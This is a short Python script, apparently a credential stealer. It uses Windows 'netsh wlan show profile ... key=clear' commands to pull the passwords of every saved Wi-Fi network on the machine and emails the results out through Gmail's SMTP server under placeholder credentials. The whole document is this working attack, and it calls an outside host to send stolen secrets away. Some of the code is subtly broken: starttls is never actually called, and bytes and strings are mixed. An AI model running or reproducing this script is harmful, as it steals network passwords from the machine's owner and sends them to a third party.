import subprocess, smtplib, re

def send_mail(email, passwd, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls
    server.login(email, passwd)
    server.sendmail(email, email, msg)
    server.quit()

command = "netsh wlan show profile"
network = subprocess.check_output(command, shell=True)
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", network)

result = ""
for network_name in network_name_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("email@gmail.com", "password", result)